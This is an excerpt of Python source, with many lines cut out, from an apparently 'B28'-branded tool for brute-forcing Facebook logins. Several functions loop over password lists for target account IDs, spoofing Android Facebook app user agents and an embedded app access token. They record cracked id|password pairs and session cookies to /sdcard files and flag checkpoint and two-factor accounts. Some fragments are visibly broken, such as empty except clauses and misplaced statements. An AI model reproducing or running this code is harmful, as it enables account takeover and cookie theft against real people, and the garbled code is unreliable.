...
def api1(ids,names,passlist):
		try:
			global ok,loop
			sys.stdout.write('\r\r\033[1;37m [B28-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
			fn = names.split(' ')[0]
			try:
				ln = names.split(' ')[1]
			except:
			...
			for pw in passlist:
				...
				q = json.loads(po)
				if 'session_key' in q:
					print('\r\r\033[1;32m [B28-OK] '+ids+' | '+pas+'\033[1;97m')
					open('/sdcard/B28-OK.txt','a').write(ids+'|'+pas+'\n')
					oks.append(ids)
					break
				elif 'www.facebook.com' in q['error_msg']:
					if 'y' in pcp:
						print('\r\r\x1b[38;5;205m [B28-CP] '+ids+' | '+pas+'\033[1;97m')
						open('/sdcard/B28-CP.txt','a').write(ids+'|'+pas+'\n')
						cps.append(ids)
						break
					else:
						open('/sdcard/B28-CP.txt','a').write(ids+'|'+pas+'\n')
...
def api2(ids,names,passlist):
        try:
                ...
                sys.stdout.write('\r\r\033[1;37m [B28-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        ua ='Dalvik/2.1.0 (Linux; U; Android 9 Build/6392; TECNO Model2) [FBAN/204.7.1.0;FBBV/747967013;FBRV/5;com.facebook.mlite;FBLC/en_US;FBMF/TECNO;FBBD/TECNO;FBDV/Model2;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=1120,height=1675};FB_FW/3;]','Dalvik/2.1.0 (Linux; U; Android 12 Build/9482; TECNO Model3) [FBAN/452.6.7.0;FBBV/435796438;FBRV/7;com.facebook.mlite;FBLC/en_US;FBMF/TECNO;FBBD/TECNO;FBDV/Model3;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.7,width=585,height=741};FB_FW/2;]','Dalvik/2.1.0 (Linux; U; Android 12 Build/6096; TECNO Model2) [FBAN/928.3.4.0;FBBV/955146747;FBRV/0;com.facebook.ocra;FBLC/en_US;FBMF/TECNO;FBBD/TECNO;FBDV/Model2;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.7,width=1271,height=948};FB_FW/3;]','Dalvik/2.1.0 (Linux; U; Android 10 Build/4041; Xiaomi Redmi Note 10) [FBAN/594.9.7.0;FBBV/247957250;FBRV/4;com.facebook.ocra;FBLC/en_US;FBMF/Xiaomi;FBBD/Xiaomi;FBDV/Redmi Note 10;FBSV/8;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.9,width=595,height=1819};FB_FW/3;]','Dalvik/2.1.0 (Linux; U; Android 10 Build/4041; Xiaomi Redmi Note 10) [FBAN/594.9.7.0;FBBV/247957250;FBRV/4;com.facebook.ocra;FBLC/en_US;FBMF/Xiaomi;FBBD/Xiaomi;FBDV/Redmi Note 10;FBSV/8;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.9,width=595,height=1819};FB_FW/3;]','Dalvik/2.1.0 (Linux; U; Android 10 Build/1675; Xiaomi Redmi Note 10) [FBAN/161.9.0.0;FBBV/745621150;FBRV/6;com.facebook.katana;FBLC/en_US;FBMF/Xiaomi;FBBD/Xiaomi;FBDV/Redmi Note 10;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.5,width=451,height=1462};FB_FW/1;]'
                        ...
                        if 'session_key' in po:
                                        ...
                                        open('/sdcard/B28-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/B28-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[B28-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
...
def api3(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [B28-M3] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
...
"Content-Length": "329",}
                        ...
                        if 'session_key' in po:
                                        ...
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print("Cookie: "+coki)
                                        open('/sdcard/B28-COOKIE.txt','a').write(coki+'\n')
                                        open('/sdcard/B28-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
...
def api4(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [B28-M4] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;206m [B28-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/B28-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
...
def api5(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [B28-M5] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
...
def api6(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m [B28-M6] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
...
def api7(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m [B28-M7] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
		...
		for fikr in passlist:
			...
			if "c_user" in EHC:
				coki=session.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
				print('\r\r\033[1;32m [B28-OK] %s | %s'%(ids,pas))
				open('/sdcard/B28-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in EHC:
...
def api8(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m [B28-M8] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
...
'Content-Length': '698'}
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [B28-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/B28-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;205m [B28-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/B28-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
	...
	try:
		for pas in passlist:
			...
			if 'session_key' in q:
				...
				open('/sdcard/B28-rnd-CP.txt','a').write(ids+'|'+pas+'\n')
				cps.append(ids)
				break
			else:
				continue
...
def trt4(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [B28-M4] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
		...
		for pas in passlist:
			...
			if 'c_user' in log_cookies:
				...
				if uid in cps:pass
					...
					print('\r\r\x1b[38;5;205m [B28-CP] '+uid+' | '+pas+'\033[1;97m')
					open('/sdcard/B28-rnd-CP.txt', 'a').write(uid+'|'+pas+'\n')
					cps.append(ids)
					break
			else:
				continue
